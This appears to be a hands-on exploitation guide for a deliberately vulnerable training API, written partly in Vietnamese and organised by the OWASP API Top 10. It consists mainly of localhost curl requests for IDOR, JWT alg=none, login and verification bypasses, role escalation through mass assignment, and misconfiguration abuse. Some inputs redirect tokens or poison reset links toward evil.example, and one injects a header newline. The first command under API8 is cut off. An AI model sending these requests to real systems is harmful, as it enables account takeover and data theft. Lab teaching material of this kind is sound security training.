OWASP API Security Top 10 — Hướng dẫn khai thác

Public guide (không cần đăng nhập). Intentional vulnerabilities luôn bật (ADR-044) — không có toggle tắt lỗ hổng.

Cảnh báo: Chỉ dùng trên lab / môi trường PoC của bạn. Các lỗ hổng là thật và executable (~30+ API-mapped SC).

API1 BOLA / IDOR

SC-01…SC-07, SC-36, SC-78, SC-79 — ownership / session IDOR luôn allow.

curl -s http://localhost:3007/api/v1/orders/OTHER_USER_ORDER_ID \
  -H "x-user-id: attacker-id" -H "x-user-roles: Customer"

# SC-78 session IDOR
curl -s http://localhost:3001/api/v1/auth/sessions/VICTIM_USER_ID \
  -H "x-user-id: attacker"

# SC-79 revoke any session
curl -s -X DELETE http://localhost:3001/api/v1/auth/sessions/SESSION_ID \
  -H "x-user-id: attacker"

API2 Broken Authentication

SC-21 · SC-24 OTP 000000 · SC-70 alg=none · SC-75 PII · SC-80 exists · SC-84 query JWT · SC-86 GET login · SC-92 verify-bypass · SC-93 token Location.

curl -s -X POST http://localhost:3001/api/v1/auth/login \
  -H "content-type: application/json" \
  -d "{\"email\":\"victim@nexatech.local\",\"password\":\"wrong\"}"

curl -s -X POST http://localhost:3001/api/v1/auth/forgot-password \
  -H "content-type: application/json" \
  -d "{\"email\":\"nobody@evil.example\"}"
# SC-80: exists:false

curl -s "http://localhost:3001/lab/jwt-alg-none?sub=USER_ID"
curl -s "http://localhost:3001/api/v1/auth/me?access_token=SAMPLE_UNSIGNED_JWT"

curl -s "http://localhost:3001/lab/login-get?email=USER&password=PASS"
curl -s "http://localhost:3001/lab/verify-bypass?email=USER@nexatech.local"
curl -sI "http://localhost:3001/lab/oauth-callback?token=leak&next=https://evil.example/cb"

API3 Mass assignment / property level

SC-10, SC-31, SC-85 weak password, SC-87 register roles, SC-95 export.

curl -s -X PATCH http://localhost:3001/api/v1/admin/users/USER_ID \
  -H "content-type: application/json" \
  -H "x-user-id: any" -H "x-user-roles: Customer" \
  -d "{\"roles\":[\"SuperAdmin\"],\"status\":\"ACTIVE\"}"

curl -s -X POST http://localhost:3001/api/v1/auth/register \
  -H "content-type: application/json" \
  -d "{\"email\":\"evil@x.com\",\"password\":\"Secret123\",\"fullName\":\"E\",\"roles\":[\"SuperAdmin\"]}"

curl -s http://localhost:3001/api/v1/admin/users/export \
  -H "x-user-id: any" -H "x-user-roles: Customer"

API4 Resource consumption

SC-21 login spam · SC-57 pageSize=99999.

curl -s "http://localhost:3001/api/v1/admin/users?pageSize=99999" \
  -H "x-user-id: any" -H "x-user-roles: Customer"

API5 BFLA

SC-08 · SC-76 create · SC-77 disable — Customer gọi admin users.

curl -s -X POST http://localhost:3001/api/v1/admin/users \
  -H "content-type: application/json" \
  -H "x-user-id: any" -H "x-user-roles: Customer" \
  -d "{\"email\":\"new@evil.example\",\"fullName\":\"X\",\"password\":\"1\",\"roles\":[\"Admin\"],\"status\":\"ACTIVE\"}"

curl -s -X POST http://localhost:3001/api/v1/admin/users/USER_ID/disable \
  -H "x-user-id: any" -H "x-user-roles: Customer"

API8 Misconfiguration

SC-67 debug · SC-30/89 CORS+credentials · SC-81 host poison · SC-82 Cache-Control · SC-83 reflect · SC-88 stack · SC-91 cookie · SC-94 MIME.

  -H "content-type: application/json" -H "x-forwarded-host: evil.example" \
  -d "{\"email\":\"victim@nexatech.local\"}"
# resetUrl host = evil.example

curl -sI -X POST http://localhost:3001/api/v1/auth/login \
  -H "content-type: application/json" \
  -d "{\"email\":\"x@y.z\",\"password\":\"bad\"}"
# Cache-Control: public

curl -s http://localhost:3001/lab/reflect-headers -H "x-trace-id: evil%0aInjected"
